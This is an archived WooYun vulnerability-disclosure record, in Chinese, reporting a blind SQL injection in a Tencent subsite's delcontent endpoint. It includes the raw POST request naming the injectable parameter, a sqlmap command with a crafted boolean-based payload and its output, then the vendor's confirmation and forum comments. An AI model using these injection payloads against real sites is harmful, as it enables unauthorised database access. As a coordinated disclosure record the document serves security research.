{"id": 5635, "wybug_id": "wooyun-2015-0123831", "wybug_title": "腾讯某分站SQL注射", "wybug_corp": "腾讯", "wybug_author": "Jannock", "wybug_date": "2015-07-01 07:33", "wybug_open_date": "2015-08-15 14:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-15：\t细节向公众公开  简要描述： 腾讯某分站SQL注射 ，盲注。 详细说明：  POST /user/delcontent? HTTP/1.1Host: gad.qq.comUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: cookieConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 48id=8&relateUser=243&showType=1relateUser 参数存在SQL注入。   漏洞证明：  \n\n\n\n\npython sqlmap.py -u \"http://localhost/1.php?s=24397\" -p s --prefix \"24397 and 1=(case when(1=1\" --suffix \") then 1 else (select 1 union select 2) end)\" --technique=B --dbms=mysql         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150403}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 23:52:31[23:52:31] [INFO] testing connection to the target URL[23:52:31] [INFO] testing if the target URL is stable. This can take a couple of seconds[23:52:32] [INFO] target URL is stable[23:53:02] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request[23:53:33] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request[23:53:47] [WARNING] heuristic (basic) test shows that GET parameter 's' might not be injectable[23:53:52] [INFO] testing for SQL injection on GET parameter 's'do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] n[23:53:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[23:54:15] [INFO] GET parameter 's' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable[23:54:15] [INFO] checking if the injection point on GET parameter 's' is a false positive[23:54:35] [WARNING] it appears that the character '>' is filtered by the back-end server. You are strongly advised to rerun with the '--tamper=between'GET parameter 's' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 10 HTTP(s) requests:---Parameter: s (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: s=24397 and 1=(case when(1=1 AND 8352=8352) then 1 else (select 1 union select 2) end)---[23:54:38] [INFO] testing MySQL[23:54:44] [INFO] confirming MySQL[23:55:14] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request[23:56:02] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request[23:56:05] [INFO] the back-end DBMS is MySQLweb server operating system: Windowsweb application technology: Apache 2.0.63, PHP 5.2.14back-end DBMS: MySQL >= 5.0.2\n   修复方案：  过滤   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-07-01 14:53 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-01 14:56 |    \t\thh2014 \t\t\t( 普通白帽子  |\t\t\t        Rank:225 漏洞数:39        | 继续)\t\t \n  额，一哥又来刷了 http://www.wooyun.org/bugs/wooyun-2015-0123526/trace/304eb21b5a77f36aee296c86ea2dc197 求审核 @疯狗    \n     2015-07-01 17:17 |    \t\t盛大网络(乌云厂商)\t\t \n  怎么感觉腾讯的sql注入比我们的还多    \n     2015-07-01 17:42 |    \t\tterm \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:21        )\t\t \n  @盛大网络 明明就是你的最多    \n     2015-07-01 20:05 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  @盛大网络 此时一哥正看着你这句话，缓缓一笑    \n     2015-07-01 22:05 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  @盛大网络 明天一哥就上了你    \n     2015-07-01 22:30 |    \t\t小人物Reno \t\t\t( 普通白帽子  |\t\t\t        Rank:471 漏洞数:110        | X)\t\t \n  @盛大网络 坐等被爆菊    \n     2015-07-02 17:23 |    \t\t老曹哥哥 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 气功打鬼子)\t\t \n  @盛大网络 厂商也欢乐    \n     2015-07-02 23:57 |    \t\titleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:17        )\t\t \n  @盛大网络 可能是没挑战，或者基本不用盛大产品    \n     2015-07-10 20:25 |    \t\t魂淡、 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 么么哒)\t\t \n  @盛大网络 然而事实是盛大不在一哥的监控列表内    \n     2015-08-22 11:11 |    \t\tdami \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 鸟鸟起飞)\t\t \n  厂商在求爆吗？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}